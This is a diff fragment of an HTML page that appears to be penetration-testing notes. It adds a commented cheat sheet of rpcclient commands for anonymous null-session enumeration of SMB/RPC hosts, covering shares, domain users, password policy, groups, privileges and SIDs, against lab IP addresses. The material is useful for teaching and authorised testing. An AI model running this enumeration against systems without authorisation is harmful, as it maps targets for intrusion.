+</span><span id="__span-28-4"><a id="__codelineno-28-4" name="__codelineno-28-4"></a><span class="gp"># </span>Connect<span class="w"> </span>to<span class="w"> </span>a<span class="w"> </span>remote<span class="w"> </span>shared<span class="w"> </span>folder<span class="w"> </span><span class="o">(</span>same<span class="w"> </span>as<span class="w"> </span>smbclient<span class="w"> </span><span class="k">in</span><span class="w"> </span>this<span class="w"> </span>regard<span class="o">)</span>
+</span><span id="__span-28-5"><a id="__codelineno-28-5" name="__codelineno-28-5"></a><span class="go">rpcclient -U &quot;&quot; 10.129.14.128</span>
+</span><span id="__span-28-6"><a id="__codelineno-28-6" name="__codelineno-28-6"></a><span class="go">rpcclient -U&#39;%&#39; 10.10.110.17</span>
+</span><span id="__span-28-7"><a id="__codelineno-28-7" name="__codelineno-28-7"></a>
+</span><span id="__span-28-8"><a id="__codelineno-28-8" name="__codelineno-28-8"></a><span class="gp"># </span>Server<span class="w"> </span>information
+</span><span id="__span-28-9"><a id="__codelineno-28-9" name="__codelineno-28-9"></a><span class="go">srvinfo</span>
+</span><span id="__span-28-10"><a id="__codelineno-28-10" name="__codelineno-28-10"></a>
+</span><span id="__span-28-11"><a id="__codelineno-28-11" name="__codelineno-28-11"></a><span class="gp"># </span>Enumerate<span class="w"> </span>all<span class="w"> </span>domains<span class="w"> </span>that<span class="w"> </span>are<span class="w"> </span>deployed<span class="w"> </span><span class="k">in</span><span class="w"> </span>the<span class="w"> </span>network<span class="w"> </span>
+</span><span id="__span-28-12"><a id="__codelineno-28-12" name="__codelineno-28-12"></a><span class="go">enumdomains</span>
+</span><span id="__span-28-13"><a id="__codelineno-28-13" name="__codelineno-28-13"></a>
+</span><span id="__span-28-14"><a id="__codelineno-28-14" name="__codelineno-28-14"></a><span class="gp"># </span>Provides<span class="w"> </span>domain,<span class="w"> </span>server,<span class="w"> </span>and<span class="w"> </span>user<span class="w"> </span>information<span class="w"> </span>of<span class="w"> </span>deployed<span class="w"> </span>domains.
+</span><span id="__span-28-15"><a id="__codelineno-28-15" name="__codelineno-28-15"></a><span class="go">querydominfo</span>
+</span><span id="__span-28-16"><a id="__codelineno-28-16" name="__codelineno-28-16"></a>
+</span><span id="__span-28-17"><a id="__codelineno-28-17" name="__codelineno-28-17"></a><span class="gp"># </span>Enumerates<span class="w"> </span>all<span class="w"> </span>available<span class="w"> </span>shares.
+</span><span id="__span-28-18"><a id="__codelineno-28-18" name="__codelineno-28-18"></a><span class="go">netshareenumall</span>
+</span><span id="__span-28-19"><a id="__codelineno-28-19" name="__codelineno-28-19"></a>
+</span><span id="__span-28-20"><a id="__codelineno-28-20" name="__codelineno-28-20"></a><span class="gp"># </span>Provides<span class="w"> </span>information<span class="w"> </span>about<span class="w"> </span>a<span class="w"> </span>specific<span class="w"> </span>share.
+</span><span id="__span-28-21"><a id="__codelineno-28-21" name="__codelineno-28-21"></a><span class="go">netsharegetinfo &lt;share&gt;</span>
+</span><span id="__span-28-22"><a id="__codelineno-28-22" name="__codelineno-28-22"></a>
+</span><span id="__span-28-23"><a id="__codelineno-28-23" name="__codelineno-28-23"></a><span class="gp"># </span>Get<span class="w"> </span>Domain<span class="w"> </span>Password<span class="w"> </span>Information
+</span><span id="__span-28-24"><a id="__codelineno-28-24" name="__codelineno-28-24"></a><span class="go">getdompwinfo</span>
+</span><span id="__span-28-25"><a id="__codelineno-28-25" name="__codelineno-28-25"></a>
+</span><span id="__span-28-26"><a id="__codelineno-28-26" name="__codelineno-28-26"></a><span class="gp"># </span>Enumerates<span class="w"> </span>all<span class="w"> </span>domain<span class="w"> </span>users.
+</span><span id="__span-28-27"><a id="__codelineno-28-27" name="__codelineno-28-27"></a><span class="go">enumdomusers</span>
+</span><span id="__span-28-28"><a id="__codelineno-28-28" name="__codelineno-28-28"></a>
+</span><span id="__span-28-29"><a id="__codelineno-28-29" name="__codelineno-28-29"></a><span class="gp"># </span>Provides<span class="w"> </span>information<span class="w"> </span>about<span class="w"> </span>a<span class="w"> </span>specific<span class="w"> </span>user.
+</span><span id="__span-28-30"><a id="__codelineno-28-30" name="__codelineno-28-30"></a><span class="go">queryuser &lt;RID&gt;</span>
+</span><span id="__span-28-31"><a id="__codelineno-28-31" name="__codelineno-28-31"></a><span class="gp">    # </span>An<span class="w"> </span>example:
+</span><span id="__span-28-32"><a id="__codelineno-28-32" name="__codelineno-28-32"></a><span class="gp">    # </span>rpcclient<span class="w"> </span>$&gt;<span class="w"> </span>queryuser<span class="w"> </span>0x3e8
+</span><span id="__span-28-33"><a id="__codelineno-28-33" name="__codelineno-28-33"></a>
+</span><span id="__span-28-34"><a id="__codelineno-28-34" name="__codelineno-28-34"></a><span class="gp"># </span>Provides<span class="w"> </span>information<span class="w"> </span>about<span class="w"> </span>a<span class="w"> </span>specific<span class="w"> </span>group.
+</span><span id="__span-28-35"><a id="__codelineno-28-35" name="__codelineno-28-35"></a><span class="go">querygroup &lt;ID&gt;</span>
+</span><span id="__span-28-36"><a id="__codelineno-28-36" name="__codelineno-28-36"></a>
+</span><span id="__span-28-37"><a id="__codelineno-28-37" name="__codelineno-28-37"></a><span class="gp"># </span>Enumerating<span class="w"> </span>Privileges
+</span><span id="__span-28-38"><a id="__codelineno-28-38" name="__codelineno-28-38"></a><span class="go">enumprivs</span>
+</span><span id="__span-28-39"><a id="__codelineno-28-39" name="__codelineno-28-39"></a>
+</span><span id="__span-28-40"><a id="__codelineno-28-40" name="__codelineno-28-40"></a><span class="gp"># </span>Enumerating<span class="w"> </span>SID<span class="w"> </span>from<span class="w"> </span>LSA
+</span><span id="__span-28-41"><a id="__codelineno-28-41" name="__codelineno-28-41"></a><span class="go">lsaenumsid</span>
 </span></code></pre></div></td></tr></table></div>
 
 <!-- This section adds support for localized revision dates -->
 
-    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago"><span class="timeago" datetime="2024-12-29T19:35:32+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date">2024-12-29</span></small></br>
+    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago"><span class="timeago" datetime="2025-01-01T20:37:04+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date">2025-01-01</span></small></br>
 
 
     <small>Created: December 27, 2024 22:00:41</small>
